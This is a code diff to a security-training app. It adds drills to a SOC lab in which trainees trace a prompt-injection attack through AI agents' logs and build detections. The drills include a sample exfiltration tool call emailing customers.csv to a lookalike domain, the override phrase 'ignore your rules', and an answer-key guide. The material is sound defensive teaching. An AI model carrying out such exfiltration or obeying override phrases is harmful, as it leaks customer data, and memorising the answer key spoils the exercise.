@@ -73,10 +73,10 @@
   }
 
   registerLab({
-    id: 'm14', n: '14', mod: 'SOC', title: 'Find the attack, build the detection', format: 'Puzzle and workbench', min: 35,
+    id: 'm14', n: '14', mod: 'SOC', title: 'Find the attack, build the detection', format: 'Puzzle, workbench and drills', min: 50,
     roles: ['SOC analyst', 'SOC lead', 'Business owner of SupportBot'],
     task: 'Twenty actions from two agents over 33 minutes. One attack is hidden in them, with red herrings. Mark the suspicious lines and the entry point, choose detection rules that would have caught it with few false alarms, then pull a kill-switch level.',
-    steps: [[2, 'Open the console'], [13, 'Find the attack and its entry point'], [10, 'Build the detection rules'], [5, 'Pick a kill-switch level'], [5, 'Reveal and debrief']],
+    steps: [[2, 'Open the console'], [13, 'Find the attack and its entry point'], [10, 'Build the detection rules'], [5, 'Pick a kill-switch level'], [15, 'Drills: telemetry, pipeline, detections, response'], [5, 'Reveal and debrief']],
     guide: ['The red herrings are a large refund approved properly and a big scheduled export by the other agent. Both trip naive rules.', 'A strong rule set: email to a new domain, knowledge-base search for export, and exports over 1,000 rows. Together they catch all three attack lines with one false alarm (the scheduled export). The attachment rule catches all three too, but with two false alarms.', 'Level 1 stops the leak fastest with least disruption; Level 3 is defensible because the agent’s instructions may still be compromised. The business owner should argue the cost.'],
     render(st) {
       init(st); const rev = !!S.revealed.m14; const cov = coverage(st);
@@ -98,13 +98,13 @@
         h('div', { class: 'filters' }, h('span', { class: 'small' }, 'Agent'), chips([['SupportBot', 'SupportBot'], ['FinanceBot', 'FinanceBot']], st.fa, 'Filter by agent'),
           h('span', { class: 'small' }, 'Action'), chips(Object.entries(TYPES), st.ft, 'Filter by action')),
         h('div', { class: 'log', role: 'group', 'aria-label': 'Agent log' }, lines.filter(Boolean).length ? lines : h('p', { class: 'sub', style: 'padding:12px' }, 'No lines match these filters.')),
-        box('', h('h3', null, 'Where did the attack start?'), marked.length ? seg(marked.map(i => [String(i), 'Line ' + (i + 1)]), st.entry, v => { st.entry = v; }, 'Entry point', 'wrap') : h('p', { class: 'sub' }, 'Mark the suspicious lines first.')),
+        box('', h('h3', null, 'Where did the attack start?'), marked.length ? seg(marked.map(i => [String(i), 'Line ' + (i + 1)]), st.entry, v => { st.entry = v; }, 'Entry point', 'multi') : h('p', { class: 'sub' }, 'Mark the suspicious lines first.')),
         box('', label('Detection workbench'), h('p', { class: 'sub' }, 'Switch rules on. The console rings every line a rule would alert on. Aim to catch the attack with as few false alarms as possible.'),
           h('div', { class: 'rules' }, RULES.map(r => { const rs = ruleStats(r.id); return h('button', { type: 'button', class: 'rulebtn', 'aria-pressed': String(!!st.rules[r.id]), onclick: () => { st.rules[r.id] = !st.rules[r.id]; commit(); } },
             h('span', { class: 'sw2' }), h('b', null, r.name), h('span', { class: 'small' }, rs.hits.length + ' alert' + (rs.hits.length === 1 ? '' : 's') + ' on this log')); })),
           stats(stat(cov.total, 'Alerts'), stat(rev ? cov.caught + ' / 3' : '?', 'Attack lines caught'), stat(rev ? cov.fp : '?', 'False alarms')),
           rev ? null : h('p', { class: 'small' }, 'Precision is shown after the reveal, so you judge the rules on their merits first.')),
-        box('dark', label('Kill switch'), seg(KILL.map(k => [k.k, k.name]), st.ks, v => { st.ks = v; }, 'Kill-switch level', 'wrap'),
+        box('dark', label('Kill switch'), seg(KILL.map(k => [k.k, k.name]), st.ks, v => { st.ks = v; }, 'Kill-switch level', 'multi'),
           ks ? [h('div', { class: 'tradeoff' }, h('span', null, 'Containment'), meter(ks.contain, 'good', 'Containment'), h('span', null, 'Business disruption'), meter(ks.disrupt, 'bad', 'Disruption')), h('p', { class: 'sub' }, 'Authorised by: ' + ks.who)] : null,
           field(st.why, v => { st.why = v; }, { id: 'm14-why', ph: 'Why this level, in one line' })),
         box('', label('Incident ticket'), h('pre', { class: 'memo-out' }, ticket(st)), h('div', { class: 'btnrow' }, copyButton(() => ticket(st), 'Copy the ticket')))
@@ -128,6 +128,52 @@
         { title: 'Kill-switch level', cats: KILL.map(k => [k.k, 'Level ' + k.k]), rows: [{ label: 'All tables', counts: count(docs.map(d => d.ks)) }] }];
     },
     done: st => !!st.ks && st.entry != null,
+    drills: [
+      { id: 'beyond', type: 'match', title: 'Beyond fixed detections', intro: 'Which practice is this?', cats: [['baseline', 'Agent behaviour monitoring'], ['hunt', 'AI threat hunting']], items: [
+        { t: 'Alert when the payables agent deviates from its normal daily pattern', a: 'baseline', why: 'Baseline each agent; alert on deviation.' },
+        { t: 'An analyst searches last month’s logs for a new injection phrase seen in the news', a: 'hunt', why: 'Search for new patterns before alerts exist.' },
+        { t: 'Flag an agent that suddenly works at 3 a.m. when it never has', a: 'baseline', why: 'Deviation from baseline.' },
+        { t: 'Look for tool calls that followed external content across all agents', a: 'hunt', why: 'Proactive search.' }] },
+      { id: 'aisoc', type: 'match', title: 'The SOC now uses AI, and must also defend it', intro: 'Is this AI for the SOC, or the SOC for AI?', cats: [['for', 'AI for the SOC'], ['of', 'The SOC for AI']], items: [
+        { t: 'A copilot triages and enriches alerts', a: 'for', why: 'AI speeding up analysts.' },
+        { t: 'Every agent is listed in the asset inventory', a: 'of', why: 'Agents are new assets to defend.' },
+        { t: 'AI drafts the incident summary for the CISO', a: 'for', why: 'Watch for over-trust and injection via alert data.' },
+        { t: 'Detections for prompt attacks and runaway agents', a: 'of', why: 'AI-specific detections.' },
+        { t: 'A playbook for AI incidents, including purging poisoned memory', a: 'of', why: 'Playbooks for AI incidents.' },
+        { t: 'AI writes threat-hunting queries', a: 'for', why: 'Analyst productivity.' }] },
+      { id: 'telemetry', type: 'match', title: 'What the SOC must see from every agent', intro: 'Which telemetry field shows this?', wide: true, cats: [['inputs', 'Inputs'], ['sources', 'Sources'], ['tools', 'Tool calls'], ['ids', 'Identities'], ['policy', 'Policy decisions'], ['outputs', 'Outputs'], ['usage', 'Usage'], ['errors', 'Errors']], items: [
+        { t: 'The résumé uploaded through the careers portal', a: 'inputs', why: 'Prompts and uploaded content.' },
+        { t: 'Which documents the assistant retrieved before answering', a: 'sources', why: 'Documents and pages retrieved.' },
+        { t: 'send_email(to=records@supp0rt-archive.net, attach=customers.csv)', a: 'tools', why: 'Which tool, with which arguments.' },
+        { t: 'Priya and the payables agent, together', a: 'ids', why: 'The person and the agent.' },
+        { t: 'Export blocked: data class “customer PII”', a: 'policy', why: 'Allowed, blocked or escalated.' },
+        { t: 'Thirty times the usual tokens on one key overnight', a: 'usage', why: 'LLMjacking shows up here first.' },
+        { t: 'The same order request retried 1,100 times', a: 'errors', why: 'Failures, retries and loops.' },
+        { t: 'The salary figures returned in the answer', a: 'outputs', why: 'Responses and data returned.' }] },
+      { id: 'pipeline', type: 'match', title: 'From agent activity to SOC action', intro: 'Which stage of the monitoring pipeline does this?', wide: true, cats: [['agents', 'Agents'], ['gateway', 'AI gateway'], ['siem', 'SIEM'], ['soar', 'SOAR'], ['analysts', 'Analysts']], items: [
+        { t: 'Collects telemetry and masks personal data', a: 'gateway', why: 'Collect and mask.' },
+        { t: 'Joins AI events with identity, endpoint and network logs', a: 'siem', why: 'Correlate and detect.' },
+        { t: 'Revokes a token and disables a tool within seconds', a: 'soar', why: 'Response playbooks.' },
+        { t: 'Decide whether to wake the CISO', a: 'analysts', why: 'Investigate and decide.' },
+        { t: 'Emit an event for every action', a: 'agents', why: 'Every AI app and agent emits events.' }] },
+      { id: 'detect', type: 'match', title: 'Five detections every AI SOC should run', intro: 'Which detection catches this?', wide: true, cats: [['prompt', 'Prompt attack'], ['exfil', 'Data exfiltration'], ['tool', 'Anomalous tool use'], ['priv', 'Privilege misuse'], ['runaway', 'Runaway agent']], items: [
+        { t: 'A message says “ignore your rules” and the goal suddenly changes', a: 'prompt', why: 'Block request, flag session.' },
+        { t: 'The HR copilot emails 4,000 records to a Gmail address', a: 'exfil', why: 'Hold message, alert analyst.' },
+        { t: 'The support agent calls the export tool for the first time ever', a: 'tool', why: 'Suspend tool, require approval.' },
+        { t: 'An action beyond the requesting user’s role', a: 'priv', why: 'Deny action, revoke token.' },
+        { t: '1,100 purchase orders in 40 minutes', a: 'runaway', why: 'Rate-limit, pause agent.' }] },
+      { id: 'ir', type: 'match', title: 'The familiar playbook, with AI-specific steps', intro: 'Which incident-response step is this?', wide: true, cats: [['detect', '1 · Detect'], ['contain', '2 · Contain'], ['investigate', '3 · Investigate'], ['recover', '4 · Recover'], ['learn', '5 · Learn']], items: [
+        { t: 'Disable the email tool and revoke the agent’s tokens', a: 'contain', why: 'Contain first.' },
+        { t: 'Replay the prompts, sources and tool calls', a: 'investigate', why: 'Reconstruct what happened.' },
+        { t: 'Purge the poisoned PDF and memory before restarting', a: 'recover', why: 'Or the incident comes back after restart.' },
+        { t: 'Add an injection test to the release pipeline and brief leadership', a: 'learn', why: 'Fix the control, add a test.' },
+        { t: 'An alert from AI telemetry, or a user report', a: 'detect', why: 'Where it starts.' }] },
+      { id: 'who', type: 'match', title: 'Who may pull each lever?', intro: 'Match the kill-switch level to who is authorised.', cats: [['analyst', 'SOC analyst'], ['lead', 'SOC lead'], ['owner', 'System owner or CISO'], ['exec', 'CISO with executive sign-off']], items: [
+        { t: 'Level 1 · Disable a tool', a: 'analyst', why: 'Precise and cheap: act fast.' },
+        { t: 'Level 2 · Read-only mode', a: 'lead', why: 'The agent can answer but not act.' },
+        { t: 'Level 3 · Stop one agent', a: 'owner', why: 'Halted and access revoked.' },
+        { t: 'Level 4 · Stop all agents', a: 'exec', why: 'Every AI action pauses: big business cost.' }] }
+    ],
     summary: st => ticket(init(st))
   });
 
